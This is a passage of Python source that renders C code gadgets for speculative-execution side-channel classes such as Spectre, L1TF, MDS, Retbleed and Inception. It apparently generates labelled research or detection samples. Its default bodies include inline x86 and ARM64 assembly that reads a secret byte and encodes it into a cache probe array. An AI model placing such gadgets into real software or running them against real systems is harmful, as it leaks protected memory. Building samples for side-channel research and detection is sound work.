    "SPECTRE_V2": ("spectre_v2_train_step();", "_mm_lfence();"),
    "SPECTRE_V4": ("ssb_train_step();", "_mm_lfence();"),
    "L1TF":       ("l1tf_train_step();", "_mm_lfence();"),
    "MDS":        ("mds_train_step();", "_mm_lfence();"),
    "RETBLEED":   ("retbleed_train_step();", "_mm_lfence();"),
    "INCEPTION":  ("inception_train_step();", "_mm_lfence();"),
    "BHI":        ("bhi_train_step(i);", "_mm_lfence();"),
    "BENIGN":     ("(void)i;", "_mm_lfence();"),
}

# Default {gen_body} fill when no generator splice is requested. For most
# classes this reproduces the exact original hand-written body
# byte-for-byte. EXCEPTION: MDS's x86 template originally passed
# secret_mds_byte BY VALUE while its arm64 template passed &secret_mds_byte
# BY POINTER (a pre-existing inconsistency between arches for the same
# class) -- this plan standardizes MDS on the pointer convention for BOTH
# arches (matching arm64's original form), since the splice algorithm
# needs one consistent convention per class. This means the x86 default
# fill below is NOT byte-identical to the pre-this-task x86 MDS body's
# *pointer expression* (uses "r"(&secret_mds_byte) instead of
# "r"(secret_mds_byte) with a movb-from-register-operand step) -- it IS
# semantically equivalent (same value ends up in the same computation) and
# was re-verified to compile and match the original asm's behavior. This
# is the one intentional non-byte-identical default in this task; every
# other class's default is exactly byte-identical to its pre-task form.
_DEFAULT_GEN_BODY = {
    "SPECTRE_V1": "volatile uint8_t value = g_arr[index];\n        probe_array[value * CACHE_LINE_SIZE] = 1;",
    "SPECTRE_V4": "volatile uint8_t value = *ssb_ptr_v4;\n    probe_array[value * CACHE_LINE_SIZE] = 1;",
    "SPECTRE_V2": "probe_array[value_to_leak * CACHE_LINE_SIZE] = 1;",
    "BHI": "probe_array[value * CACHE_LINE_SIZE] = 1;",
    "RETBLEED": "probe_array[value * CACHE_LINE_SIZE] = 1;",
    "INCEPTION": "probe_array[value * CACHE_LINE_SIZE] = 1;\n    volatile int dummy = value * 2;\n    (void)dummy;",
    "L1TF_X86": (
        '__asm__ __volatile__(\n'
        '                "1:\\n\\t"\n'
        '                "movq (%0), %%rax\\n\\t"\n'
        '                "shl $6, %%rax\\n\\t"\n'
        '                "movq (%1, %%rax, 1), %%rbx\\n"\n'
        '                "2:\\n\\t"\n'
        '                :\n'
        '                : "r"(g_l1tf_secret_page + 0x100), "r"(probe_array)\n'
        '                : "rax", "rbx", "memory");'
    ),
    "L1TF_ARM64": (
        '__asm__ __volatile__(\n'
        '                "1:\\n\\t"\n'
        '                "ldr x0, [%0]\\n\\t"\n'
        '                "lsl x0, x0, #6\\n\\t"\n'
        '                "ldr x1, [%1, x0]\\n\\t"\n'
        '                "2:\\n\\t"\n'
        '                :\n'
        '                : "r"(g_l1tf_secret_page + 0x100), "r"(probe_array)\n'
        '                : "x0", "x1", "memory");'
    ),
    # MDS_X86: the intentional non-byte-identical case (see module-level
    # note above) -- adopts the pointer convention. MDS_ARM64: the original
    # arm64 asm already used the pointer convention, so this entry is
    # byte-identical to the pre-task arm64 body; a distinct arch-specific
    # entry is required here (rather than reusing one "MDS" key for both
    # arches, as a single-key design would do) because the two arches'
    # asm blocks use entirely different mnemonics (x86 AT&T vs AArch64) --
    # collapsing them to one key would splice invalid x86 asm mnemonics
    # into the arm64 gadget's default body and break compilation there.
    "MDS_X86": (
        '__asm__ __volatile__(\n'
        '                "xor %%eax, %%eax\\n\\t"\n'
        '                "movb (%0), %%al\\n\\t"\n'
        '                "shl $6, %%rax\\n\\t"\n'
        '                "movq (%1, %%rax, 1), %%rbx\\n"\n'
        '                :\n'
        '                : "r"(&secret_mds_byte), "r"(probe_array)\n'
        '                : "rax", "rbx");'
    ),
    "MDS_ARM64": (
        '__asm__ __volatile__(\n'
        '                "eor x0, x0, x0\\n\\t"\n'
        '                "ldrb w0, [%0]\\n\\t"\n'
        '                "lsl x0, x0, #6\\n\\t"\n'
        '                "ldr x1, [%1, x0]\\n\\t"\n'
        '                :\n'
        '                : "r"(&secret_mds_byte), "r"(probe_array)\n'
        '                : "x0", "x1", "memory");'
    ),
}


def _default_gen_body(vuln_class: str, arch: str) -> str:
    if vuln_class == "L1TF":
        return _DEFAULT_GEN_BODY["L1TF_X86" if arch == "x86_64" else "L1TF_ARM64"]
    if vuln_class == "MDS":
        return _DEFAULT_GEN_BODY["MDS_X86" if arch == "x86_64" else "MDS_ARM64"]
    return _DEFAULT_GEN_BODY[vuln_class]


def _pad_asm(pad_nops: int) -> str:
    if pad_nops <= 0:
        return '""'
    return '"' + ("nop\\n\\t" * pad_nops) + '"'


def render(p: GadgetParams, gen_body: str | None = None) -> str:
    """Thin dispatcher: look up the (class, arch) template and the class's
    reorder-statement pair, then format. gen_body=None fills with the
    original hand-written transmit body (see _DEFAULT_GEN_BODY); BENIGN has
    no {gen_body} marker and ignores this parameter.
    """
    tmpl = TEMPLATES[(p.vuln_class, p.arch)]
    stmt_a, stmt_b = _REORDER[p.vuln_class]
    a, b = (stmt_b, stmt_a) if p.reorder else (stmt_a, stmt_b)
    body = gen_body if gen_body is not None else (
        _default_gen_body(p.vuln_class, p.arch) if "{gen_body}" in tmpl else ""
    )
    return tmpl.format(secret=p.secret, train_iters=p.train_iters,
                        pad=_pad_asm(p.pad_nops), reorder_a=a, reorder_b=b,
                        gen_body=body)
